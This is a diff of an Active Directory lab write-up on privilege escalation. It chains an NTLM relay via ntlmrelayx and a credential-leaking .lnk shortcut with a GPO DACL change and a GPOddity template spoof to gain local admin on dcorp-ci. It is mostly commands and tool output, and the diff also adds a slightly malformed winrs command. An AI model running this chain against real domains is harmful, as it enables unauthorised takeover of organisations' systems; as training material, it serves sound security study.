@@ -1,20 +1,51 @@
-# Learning Objective 06
+# Learning Objective 06 (Privilege Escalation | Relaying + GPO Abuse)
 
 ## Tasks
 
-1. **Abuse an overly permissive Group Policy to get admin access on `dcorp-ci`**
+1. **Abuse an overly permissive GPO to get local admin access on `dcorp-ci`**
 
 ---
 
 ## Solution
 
-1. **Abuse an overly permissive Group Policy to get admin access on `dcorp-ci`**
-
-**GPO abuse for admin access on `dcorp-ci`**
-
-In *Learning Objective 01*, we enumerated that there is a directory called `AI` on the `dcorp-ci` machine where 'Everyone' has access. Looking at the directory, we will find a log file.
+1. **Abuse an overly permissive GPO to get local admin access on `dcorp-ci`**
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
+```
+
+`. C:\AD\Tools\PowerView.ps1`
+
+`Get-DomainGPO -Identity "DevOps Policy"`:
+```
+flags                    : 0
+displayname              : DevOps Policy📑
+gpcmachineextensionnames📌 : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+whenchanged              : 12/24/2024 7:09:01 AM
+versionnumber            : 3
+name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
+cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+usnchanged               : 296496
+dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
+objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
+gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
+distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,D
+                           C=local
+whencreated              : 12/18/2024 7:31:22 AM
+showinadvancedviewonly   : True
+usncreated               : 293100
+gpcfunctionalityversion  : 2
+instancetype             : 4
+objectclass              : {top, container, groupPolicyContainer}
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+```
+
+**`DevOps Policy` GPO abuse for local admin access on `dcorp-ci`**
+
+In *Learning Objective 01*, we enumerated that there is a directory called `AI` on the `dcorp-ci` machine where 'Everyone' has access. Looking at the directory, we will find a log file.
 
 `net view \\dcorp-ci`:
 ```
@@ -57,7 +88,7 @@ First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to
 ```
 23: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 group default qlen 1
     link/ether 00:15:5d:fd:78:0c
-    inet 172.16.100.22/24📌 brd 172.16.100.255 scope global dynamic
+    inet 172.16.100.22📌/24 brd 172.16.100.255 scope global dynamic
        valid_lft forever preferred_lft forever
     inet6 fe80::d5b9:a798:6a3d:c87/64 scope link dynamic
        valid_lft forever preferred_lft forever
@@ -69,7 +100,7 @@ First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to
        valid_lft forever preferred_lft forever
 ```
 
-Use "WSLToTh3Rescue!" as the sudo password.
+Use "WSLToTh3Rescue!" as the `sudo` password.
 
 `sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.22 --http-port '80,8080' -i --no-smb-server`:
 ```
@@ -107,7 +138,7 @@ On the student VM, let's create a shortcut that connects to the ntlmrelayx liste
 
 Use the following command as the shortcut:
 
-```
+```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.22' -UseDefaultCredentials"
 ```
 
@@ -123,22 +154,22 @@ C:\AD\Tools\student422.lnk
 
 The simulation on `dcorp-ci`, will execute the `.lnk` file within a minute.
 
-This is what the listener looks like on a successful connection:
-
 ![dcorp-std422 | wsluser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-wsluser-e95420?logo=ubuntu&logoColor=white)
+
+This is what the listener looks like on a successful connection:
 
 ```
 [...]
 
 [*] HTTPD(80): Client requested path: /
 [*] HTTPD(80): Client requested path: /
-[*] HTTPD(80): Connection from 172.16.3.11 controlled, attacking target ldaps://172.16.2.1
+[*] HTTPD(80): Connection from 172.16.3.11📌 controlled, attacking target ldaps://172.16.2.1
 [*] HTTPD(80): Client requested path: /
 [*] HTTPD(80): Authenticating against ldaps://172.16.2.1 as DCORP/DEVOPSADMIN SUCCEED📌
 [*] Started interactive Ldap shell via TCP on 127.0.0.1:11000📌 as DCORP/DEVOPSADMIN
 ```
 
-Connect to the ldap shell started on port 11000. Run the following command **from a new Ubuntu WSL session**.
+Connect to the LDAP shell started on port 11000. Run the following command **from a new Ubuntu WSL session**.
 
 `nc 127.0.0.1 11000`:
 ```
@@ -147,7 +178,7 @@ Type help for list of commands
 #
 ```
 
-Using this ldap shell, we will provide the `student422` user, `WriteDACL` permissions over `DevOps` policy `{0BF8D01C-1F62-4BDC-958C-57140B67D147}`.
+Using this LDAP shell, we will assign `WriteDACL` permissions on the `DevOps Policy` GPO `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` to the `student422` user.
 
 ![dcorp-std422 | wsluser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-wsluser-e95420?logo=ubuntu&logoColor=white)
 
@@ -158,13 +189,13 @@ u:dcorp\devopsadmin
 
 `write_gpo_dacl student422 {0BF8D01C-1F62-4BDC-958C-57140B67D147}`:
 ```
-Adding student422 to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+Adding student422 to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
 LDAP server claims to have taken the secdescriptor. Have fun
 ```
 
 <🔄 Alternative Step🔄>
 
-Alternatively, if we do not have access to any domain users, we can add a computer object and provide it the `write_gpo_dacl` permissions on `DevOps` policy `{0BF8D01C-1F62-4BDC-958C-57140B67D147}`.
+Alternatively, if we do not have access to any domain users (in our case `student422`), we can add a computer object and assign `WriteDACL` permissions on the `DevOps Policy` GPO `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` to it.
 
 `add_computer std422-gpattack Secretpass@123`:
 ```
@@ -183,9 +214,9 @@ LDAP server claims to have taken the secdescriptor. Have fun
 
 </🔄 Alternative Step🔄>
 
-Stop the ldap shell and ntlmrelayx using `ctrl+c`.
+Stop the LDAP shell and ntlmrelayx using `ctrl+c`.
 
-Now, run the GPOddity command to create the new template.
+Now, run the GPOddity command to create the new malicious group policy template.
 
 `cd /mnt/c/AD/Tools/GPOddity`
 
@@ -196,9 +227,9 @@ Now, run the GPOddity command to create the new template.
 === GENERATING MALICIOUS GROUP POLICY TEMPLATE ===📌
 
 [*] Downloading the legitimate GPT from SYSVOL
-[+] Successfully downloaded legitimate GPO from SYSVOL to 'GPT_out' folder
-[*] Injecting malicious scheduled task into initialized GPT
-[+] Successfully injected malicious scheduled task📌
+[+] Successfully downloaded legitimate GPO from SYSVOL to 'GPT_out' folder📌
+[*] Injecting malicious scheduled task into initialized GPT📌
+[+] Successfully injected malicious scheduled task
 [*] Initiating LDAP connection
 [+] LDAP bind successful
 [*] Updating downloaded GPO version number to ensure automatic GPO application
@@ -206,7 +237,7 @@ Now, run the GPOddity command to create the new template.
 
 === SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ===
 
-[*] Modifying the gPCFileSysPath attribute of the GPC to '\\172.16.100.22\std422-gp'
+[*] Modifying the gPCFileSysPath attribute of the GPC to '\\172.16.100.22\std422-gp'📌
 [+] Successfully spoofed GPC gPCFileSysPath attribute
 [*] Updating the versionNumber attribute of the GPC
 [+] Successfully updated GPC versionNumber attribute
@@ -221,11 +252,19 @@ Leave GPOddity running and **from another Ubuntu WSL session**, create and share
 
 ![dcorp-std422 | wsluser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-wsluser-e95420?logo=ubuntu&logoColor=white)
 
+`ls /mnt/c/AD/Tools/GPOddity/GPT_out/`:
+```
+total 0
+drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 Machine
+drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 User
+-rwxrwxrwx 1 wsluser wsluser   56 Feb 20 07:47 gpt.ini📌
+```
+
 `mkdir /mnt/c/AD/Tools/std422-gp`
 
-`cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std422-gp`
+`cp -r /mnt/c/AD/Tools/GPOddity/GPT_out/* /mnt/c/AD/Tools/std422-gp`
 
-**From a command prompt ('run as administrator') on the student VM**, run the following commands to allow 'Everyone' full permission on the `std422-gp` share.
+**From a command prompt ('run as administrator') on the student VM**, run the following commands to configure both network sharing and file system permissions, ensuring that 'Everyone' has full access to the `std422-gp` directory for both remote and local interactions.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -257,7 +296,7 @@ processed file: C:\AD\Tools\std422-gp\Machine\Scripts\Startup
 Successfully processed 16 files; Failed processing 0 files
 ```
 
-Verify if the `gPCfileSysPath` has been modified for the `DevOps` policy. Run the following PowerView command.
+Verify if the `gPCfileSysPath` has been modified for the `DevOps Policy` GPO. Run the following PowerView command.
 
 `C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
@@ -266,7 +305,7 @@ Verify if the `gPCfileSysPath` has been modified for the `DevOps` policy. Run th
 
 `. C:\AD\Tools\PowerView.ps1`
 
-`Get-DomainGPO -Identity 'DevOps Policy'`:
+`Get-DomainGPO -Identity "DevOps Policy"`:
 ```
 flags                    : 0
 displayname              : DevOps Policy📑
@@ -293,12 +332,12 @@ objectclass              : {top, container, groupPolicyContainer}
 objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
 ```
 
-The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, `student422` should be added to the local administrators group on `dcorp-ci`.
+The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, `student422` should be added to the local "Administrators" group on `dcorp-ci`.
 
-`winrs -r:dcorp-ci cmd /c "set computername && set username"`:
+`winrs -r:dcorp-ci cmd: /c "set computername && set username"`:
 ```
-COMPUTERNAME=DCORP-CI
-USERNAME=student422
+COMPUTERNAME=DCORP-CI🖥️
+USERNAME=student422👤
 ```
 🚩
 
